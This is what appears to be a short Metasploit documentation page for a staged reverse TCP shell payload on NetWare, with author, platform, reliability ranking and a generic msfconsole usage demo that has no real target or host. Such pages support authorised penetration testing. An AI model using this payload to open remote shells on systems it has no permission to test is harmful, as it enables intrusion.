## NetWare Command Shell, Reverse TCP Stager

Connect to the NetWare console (staged). Connect back to the 
attacker


## Module Name
payload/netware/shell/reverse_tcp

## Authors
* toto





## Platforms
* netware

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/netware/shell/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    